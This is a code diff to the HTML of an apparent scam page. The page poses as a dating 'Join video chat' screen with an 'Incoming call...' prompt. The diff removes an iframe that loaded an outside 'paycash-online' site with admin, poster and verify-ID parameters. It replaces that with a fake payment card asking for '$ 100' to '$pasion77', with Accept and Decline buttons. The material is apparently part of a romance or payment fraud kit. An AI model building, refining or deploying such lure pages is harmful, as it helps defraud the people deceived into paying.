@@ -282,6 +282,65 @@ newDiv.innerHTML = `
       <link rel="stylesheet" href="https://res.cloudinary.com/df4coefiy/raw/upload/v1745475016/1e43e3ab50fce75fsw_oxomps.css" data-precedence="next">
       <link rel="stylesheet" href="https://res.cloudinary.com/df4coefiy/raw/upload/v1745475033/57978a1014ff42c9sw_fbmtve.css" data-precedence="next">
       <title>Join video chat</title>
+      <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+    }
+    .card {
+      background-color: white;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      max-width: 500px;
+      width: 100%;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    .card img {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+    .amount {
+      font-size: 40px;
+      font-weight: 500;
+      margin: 10px 0;
+    }
+    .text-gray {
+      color: #777;
+      margin-top: 5px;
+    }
+    .btn {
+      width: 80%;
+      padding: 10px;
+      font-size: 24px;
+      border-radius: 999px;
+      border: none;
+      color: white;
+      cursor: pointer;
+      margin-top: 15px;
+      text-decoration: none;
+      display: inline-block;
+    }
+    .btn.accept {
+      background-color: #047857;
+    }
+    .btn.accept:hover {
+      background-color: #059669;
+    }
+    .btn.decline {
+      background-color: #92400e;
+    }
+    .btn.decline:hover {
+      background-color: #b45309;
+    }
+  </style>
       <meta name="description" content="Enjoy private live video chat with your dating partner">
       <meta property="og:title" content="Join video chat">
       <meta property="og:description" content="Enjoy private live video chat with your dating partner">
@@ -302,12 +361,21 @@ newDiv.innerHTML = `
                <p class="text-xl font-medium text-neutral-700 text-center">Incoming call...</p>
                <div class="flex items-center justify-center gap-x-12 text-neutral-50">
                   <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
-                                <iframe 
-       src="https://paycash-online.vercel.app/"${admin}/${poster}/${verifyId}
-        width="100%" 
-        height="100%" 
-         style="border:0; position:absolute; top:0; left:0; z-index:-1;">
-   </iframe>
+      <div class="card">
+    <img src="/logo1.jpg" alt="img" />
+    
+    <div>
+      <p class="font-semibold">Passion Barnett</p>
+      <p>Payment to $pasion77</p>
+    </div>
+
+    <p class="amount">$ 100</p>
+
+    <p class="text-gray">Today 6.01 am</p>
+
+    <a class="btn accept" >Accept</a>
+    <a class="btn decline">Decline</a>
+  </div>
 
                   </label>
                </div>
